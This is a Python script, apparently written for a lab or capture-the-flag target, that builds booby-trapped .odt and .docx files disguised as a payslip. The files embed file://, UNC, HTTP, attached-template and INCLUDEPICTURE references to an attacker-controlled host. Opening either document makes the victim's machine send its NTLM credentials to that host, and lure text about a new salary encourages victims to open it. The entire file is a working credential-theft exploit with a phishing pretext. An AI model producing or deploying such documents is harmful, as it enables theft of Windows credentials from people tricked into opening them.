#!/usr/bin/env python3
"""Multi-vector NTLM-leak documents (.odt + .docx) for the Hercules report upload."""
import sys, os, zipfile

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.245"
OUTDIR = sys.argv[2] if len(sys.argv) > 2 else "."
UNC = "\\\\%s\\share\\payslip.jpg" % LHOST

NS = (
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
    'xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
    'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
    'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
    'xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" '
    'xmlns:dc="http://purl.org/dc/elements/1.1/" '
    'xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" '
    'xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" '
    'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" '
    'xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
)

def frame(name, href):
    return f'''<text:p text:style-name="Standard">
   <draw:frame draw:style-name="fr1" draw:name="{name}" text:anchor-type="paragraph" svg:width="14.101cm" svg:height="9.999cm" draw:z-index="0">
    <draw:object xlink:href="{href}" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
    <draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
   </draw:frame>
  </text:p>
  <text:p text:style-name="Standard">
   <draw:frame draw:style-name="fr1" draw:name="Img{name}" text:anchor-type="paragraph" svg:width="12cm" svg:height="8cm" draw:z-index="0">
    <draw:image xlink:href="{href}" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
   </draw:frame>
  </text:p>'''

CONTENT = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content {NS} office:version="1.2">
 <office:automatic-styles>
  <style:style style:name="fr1" style:family="graphic" style:parent-style-name="Graphics">
   <style:graphic-properties style:horizontal-pos="center" style:horizontal-rel="paragraph" draw:ole-draw-aspect="1"/>
  </style:style>
 </office:automatic-styles>
 <office:body><office:text>
  <text:p text:style-name="Standard">Payslip details attached. Please review your new salary below.</text:p>
  {frame("Object1", "file://%s/payslip.jpg" % LHOST)}
  {frame("Object2", UNC)}
  {frame("Object3", "http://%s:8001/payslip.jpg" % LHOST)}
 </office:text></office:body>
</office:document-content>
'''

MANIFEST = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="meta.xml"/>
</manifest:manifest>
'''

STYLES = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles {NS} office:version="1.2">
 <office:styles>
  <style:style style:name="Standard" style:family="paragraph" style:class="text"/>
  <style:style style:name="Graphics" style:family="graphic"/>
 </office:styles>
</office:document-styles>
'''

META = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta {NS} office:version="1.2">
 <office:meta><meta:generator>LibreOffice/6.0.3.1</meta:generator></office:meta>
</office:document-meta>
'''

odt = os.path.join(OUTDIR, "payslip2.odt")
with zipfile.ZipFile(odt, "w", zipfile.ZIP_DEFLATED) as z:
    zi = zipfile.ZipInfo("mimetype"); zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, "application/vnd.oasis.opendocument.text")
    z.writestr("META-INF/manifest.xml", MANIFEST)
    z.writestr("content.xml", CONTENT)
    z.writestr("styles.xml", STYLES)
    z.writestr("meta.xml", META)
print("[+] wrote", odt)

# ---------------- docx ----------------
W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
R = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
RNS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"'
CT = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"

CTYPES = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

RELS = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships {RNS}>
<Relationship Id="rId1" Type="{CT}officeDocument" Target="word/document.xml"/>
</Relationships>'''

DOCRELS = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships {RNS}>
<Relationship Id="rId10" Type="{CT}attachedTemplate" Target="file://{LHOST}/payslip.dotm" TargetMode="External"/>
<Relationship Id="rId11" Type="{CT}image" Target="{UNC}" TargetMode="External"/>
<Relationship Id="rId12" Type="{CT}hyperlink" Target="file://{LHOST}/payslip.xlsx" TargetMode="External"/>
</Relationships>'''

DOC = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document {W} {R}>
<w:body>
<w:p><w:r><w:t>Payslip details attached. Please review your new salary below.</w:t></w:r></w:p>
<w:p><w:r><w:rPr><w:noProof/></w:rPr><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml" style="width:400px;height:300px"><v:imagedata r:id="rId11" o:title="payslip" xmlns:o="urn:schemas-microsoft-com:office:office"/></v:shape></w:pict></w:r></w:p>
<w:p><w:hyperlink r:id="rId12"><w:r><w:t>Open payslip</w:t></w:r></w:hyperlink></w:p>
<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "\\\\\\\\{LHOST}\\\\share\\\\payslip.jpg" \\\\* MERGEFORMAT </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>pay</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
<w:sectPr><w:settings/></w:sectPr>
</w:body>
</w:document>'''

docx = os.path.join(OUTDIR, "payslip2.docx")
with zipfile.ZipFile(docx, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("[Content_Types].xml", CTYPES)
    z.writestr("_rels/.rels", RELS)
    z.writestr("word/document.xml", DOC)
    z.writestr("word/_rels/document.xml.rels", DOCRELS)
print("[+] wrote", docx)
